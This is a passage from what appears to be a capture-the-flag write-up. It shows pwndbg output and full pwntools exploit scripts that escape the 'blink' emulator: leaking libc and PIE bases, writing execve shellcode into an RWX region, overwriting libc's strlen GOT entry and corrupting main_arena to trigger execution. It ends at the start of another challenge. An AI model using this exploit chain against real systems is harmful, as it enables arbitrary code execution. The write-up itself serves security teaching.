</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; search -8 0x4141414141414141
</span></span><span class="line"><span class="cl">Searching for value: b&#39;AAAAAAAA&#39;
</span></span><span class="line"><span class="cl">[anon_00400]    0x401003 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[anon_55a7647a3] 0x55a7647a3048 mov rsi, rbx /* 0x4141414141414141 */
</span></span><span class="line"><span class="cl">[heap]          0x55a76d86c898 &#39;AAAAAAAA&#39;
</span></span><span class="line"><span class="cl">[heap]          0x55a76d86ce9c 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[heap]          0x55a76d86cec3 0x4141414141414141 (&#39;AAAAAAAA&#39;)
</span></span><span class="line"><span class="cl">[heap]          0x55a76d86ced8 &#39;AAAAAAAA&#39;
</span></span><span class="line"><span class="cl">pwndbg&gt; x/50gx 0x55a76d86c898-0x28
</span></span><span class="line"><span class="cl">0x55a76d86c870:	0x0000000000000000	0x0000000000005671
</span></span><span class="line"><span class="cl">0x55a76d86c880:	0x0000000000401033	0xf000120200000202
</span></span><span class="line"><span class="cl">0x55a76d86c890:	0x0000000000000000	0x4141414141414141
</span></span><span class="line"><span class="cl">0x55a76d86c8a0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55a76d86c8b0:	0x0000000000000000	0x00007fcde3cd3000
</span></span><span class="line"><span class="cl">0x55a76d86c8c0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55a76d86c8d0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55a76d86c8e0:	0x000055a764770000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55a76d86c8f0:	0x0000000000000000	0x03010102464c457f
</span></span><span class="line"><span class="cl">0x55a76d86c900:	0x03010102464c457f	0x0000000000000000
</span></span><span class="line"><span class="cl">pwndbg&gt; pie
</span></span><span class="line"><span class="cl">Calculated VA from /app/blink = 0x55a764770000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have pie base, let&rsquo;s start crafting the <code>stage_3</code>, which is writing shellcode to the <code>rwx</code> region of <code>blink</code>.</p>
<h4 id="stage-3-write-shellcode-to-rwx-region">Stage 3: Write shellcode to <code>RWX</code> region</h4>
<p>Observe that the <code>rwx</code> region has constant offset from the pie base, which is <code>0x033000</code>. I just choose a random offset, and I decided that I will put my shellcode at <code>pie_base+0x033000+0x150</code>. Now the question, what should be our <code>shellcode</code>?</p>
<p>Observe that in <code>runner.py</code>, it runs the <code>blink</code> with <code>subprocess</code>, and based on my experience, we can&rsquo;t spawn a shell with it. So, I decided to craft a shellcode that will do <code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /f*&quot;])</code>, which will directly print the <code>flag</code> if it is got executed. Let&rsquo;s modify our script to put this shellcode to the <code>rwx</code> region.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;cat /f*&#34;])</span>
</span></span><span class="line"><span class="cl"><span class="n">cat_flag_sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0x68732f6e69622f
</span></span></span><span class="line"><span class="cl"><span class="s1">push rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0x2a662f20746163
</span></span></span><span class="line"><span class="cl"><span class="s1">push rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r10, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0x632d
</span></span></span><span class="line"><span class="cl"><span class="s1">push rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r11, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x0
</span></span></span><span class="line"><span class="cl"><span class="s1">push r10
</span></span></span><span class="line"><span class="cl"><span class="s1">push r11
</span></span></span><span class="line"><span class="cl"><span class="s1">push rdi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">xor rdx, rdx
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x3b
</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode_payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cat_flag_sc</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw_sc_8</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">cat_flag_sc</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode_payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, </span><span class="si">{</span><span class="n">raw_sc_8</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov QWORD PTR [r9], r12
</span></span></span><span class="line"><span class="cl"><span class="s1">    add r9, 8&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">%use masm
</span></span></span><span class="line"><span class="cl"><span class="s1">_start:
</span></span></span><span class="line"><span class="cl"><span class="s1">    nop
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x4141414141414141 ; just for debugging purpose, to easily find the emulated registers value
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_1: ; find libc base address
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r13, 0x03010102464c457f; set r13 to libc first 8 bytes
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, QWORD PTR [rsp]; set r12 to rsp content
</span></span></span><span class="line"><span class="cl"><span class="s1">    cmp r12, r13 ; compare it
</span></span></span><span class="line"><span class="cl"><span class="s1">    je stage_2 ; if it is equals, jump to stage_2
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rsp, 8 ; else, increase the rsp by 8
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp stage_1
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_2: ; find pie base address
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r9, rsp ; copy libc base to r9
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r9, 0x001d10 ; now r9 contains pie_base
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r9, QWORD PTR [r9] ; set r9 to r9 content, which is pie_base
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_3: ; smuggle shellcode
</span></span></span><span class="line"><span class="cl"><span class="s1">    add r9, 0x33150 ; set it to rwx+0x150
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, r9 ; store it in rbx, because we will need this address later
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">{</span><span class="n">shellcode_payload</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp stage_4
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_4: ; for now, set stage_4 to infinite loop first
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp stage_4
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create and compile the assembly</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;simple.s&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">sc</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;nasm -f elf64 simple.s -o simple.o &amp;&amp; ld -o simple simple.o &amp;&amp; chmod 755 simple&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to docker</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;simple&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;137.184.6.25&#39;</span><span class="p">,</span> <span class="mi">17003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">17003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;len: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, the <code>stage_3</code> assembly will split our <code>execve</code> shellcode by 8, then put it in the <code>rwx</code> region one-by-one.</p>
<p>Now, we will move to the final step which is <code>stage_4</code>. To recap, what we have done so far:</p>
<ul>
<li>Get <code>libc</code> base address.</li>
<li>Get PIE base address and the <code>rwx</code> region address.</li>
<li>Put shellcode in <code>rwx</code> region.</li>
</ul>
<h4 id="stage-4-rip-control">Stage 4: RIP Control</h4>
<p>The final step is obvious, which is trying to control our emulated code to jump to our shellcode. My strategy is to overwrite the <code>strlen</code> GOT entry in the <code>libc</code> to our <code>shellcode</code> address. In order to trigger the <code>strlen</code>, I need to somehow trigger the <code>__libc_message</code> function, which will use <code>strlen</code> in the process. To trigger it, we need to somehow trigger <code>malloc</code> or <code>free</code> error on it.</p>
<p>After playing around in the gdb for a while, I found a way to do it. With the OOB access that I have, I overwrite the libc <code>main_arena+0x10</code> with garbage. Then, if I try to emulate <code>mov</code> instruction after it, seems like <code>blink</code> need to do some allocation to emulate that, and because I corrupt the <code>main_arena+0x10</code>, it will trigger error and <code>strlen</code> GOT (which has been replaced to the address of our <code>shellcode</code>) will be called, and our shellcode will be executed.</p>
<p>So, to summarize, the final step (<code>stage_4</code>) is:</p>
<ul>
<li>Overwrite the <code>strlen</code> GOT entry in <code>libc</code> with our <code>execve</code> shellcode address.
<ul>
<li><code>strlen</code> GOT entry is located in <code>libc_base+0x219098</code>.</li>
</ul>
</li>
<li>Overwrite the libc <code>main_arena+0x10</code> value with garbage.
<ul>
<li>The starting offset of <code>main_arena</code> is located in <code>libc_base+0x219c80</code>.</li>
</ul>
</li>
<li>Execute any <code>mov</code> instructions to trigger the allocation error.</li>
</ul>
<p>Now, let&rsquo;s modify our script to do the <code>stage_4</code>, which is my final script that I used to solve the challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-c&#34;, &#34;cat /f*&#34;])</span>
</span></span><span class="line"><span class="cl"><span class="n">cat_flag_sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0x68732f6e69622f
</span></span></span><span class="line"><span class="cl"><span class="s1">push rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rdi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0x2a662f20746163
</span></span></span><span class="line"><span class="cl"><span class="s1">push rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r10, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, 0x632d
</span></span></span><span class="line"><span class="cl"><span class="s1">push rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r11, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x0
</span></span></span><span class="line"><span class="cl"><span class="s1">push r10
</span></span></span><span class="line"><span class="cl"><span class="s1">push r11
</span></span></span><span class="line"><span class="cl"><span class="s1">push rdi
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rsi, rsp
</span></span></span><span class="line"><span class="cl"><span class="s1">xor rdx, rdx
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x3b
</span></span></span><span class="line"><span class="cl"><span class="s1">syscall
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode_payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cat_flag_sc</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw_sc_8</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">cat_flag_sc</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">shellcode_payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, </span><span class="si">{</span><span class="n">raw_sc_8</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov QWORD PTR [r9], r12
</span></span></span><span class="line"><span class="cl"><span class="s1">    add r9, 8&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sc</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">%use masm
</span></span></span><span class="line"><span class="cl"><span class="s1">_start:
</span></span></span><span class="line"><span class="cl"><span class="s1">    nop
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x4141414141414141 ; just for debugging purpose, to easily find the emulated registers value
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_1: ; find libc base address
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r13, 0x03010102464c457f; set r13 to libc first 8 bytes
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r12, QWORD PTR [rsp]; set r12 to rsp content
</span></span></span><span class="line"><span class="cl"><span class="s1">    cmp r12, r13 ; compare it
</span></span></span><span class="line"><span class="cl"><span class="s1">    je stage_2 ; if it is equals, jump to stage_2
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rsp, 8 ; else, increase the rsp by 8
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp stage_1
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_2: ; find pie base address
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r9, rsp ; copy libc base to r9
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r9, 0x001d10 ; now r9 contains pie_base
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r9, QWORD PTR [r9] ; set r9 to r9 content, which is pie_base
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_3: ; smuggle shellcode
</span></span></span><span class="line"><span class="cl"><span class="s1">    add r9, 0x33150 ; set it to rwx+0x150
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rbx, r9 ; store it in rbx, because we will need this address later
</span></span></span><span class="line"><span class="cl"><span class="s1"></span><span class="si">{</span><span class="n">shellcode_payload</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp stage_4
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">stage_4: ; overwrite strlen got + trigger malloc/free error
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r10, rsp ; copy libc base to r10
</span></span></span><span class="line"><span class="cl"><span class="s1">    add r10, 0x219098 ; point it to strlen GOT entry
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov QWORD PTR [r10], rbx ; change its value to our shellcode address
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, rsp ; copy libc base to rdi
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    ; change main_arena+0x10 value to garbage (0x4141414141414141)
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rdi, 0x219c80
</span></span></span><span class="line"><span class="cl"><span class="s1">    add rdi, 0x10
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov QWORD PTR [rdi], rax
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    ; mov instruction will somehow trigger malloc, and due to
</span></span></span><span class="line"><span class="cl"><span class="s1">    ; we corrupt the main_arena+0x10 with garbage, it will
</span></span></span><span class="line"><span class="cl"><span class="s1">    ; trigger malloc error
</span></span></span><span class="line"><span class="cl"><span class="s1">    mov QWORD PTR [rdi], rax
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create and compile the assembly</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;simple.s&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">sc</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;nasm -f elf64 simple.s -o simple.o &amp;&amp; ld -o simple simple.o &amp;&amp; chmod 755 simple&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to docker</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;simple&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;137.184.6.25&#39;</span><span class="p">,</span> <span class="mi">17003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">17003</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;len: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: CJ2023{80cf59c8fe2fc802b5fc532cb2a3843f}</strong></p>
</blockquote>
<h2 id="sorearm">sorearm</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>cant pwn with my sorearm</p>
<p>137.184.6.25 17002</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis-2">Initial Analysis</h3>
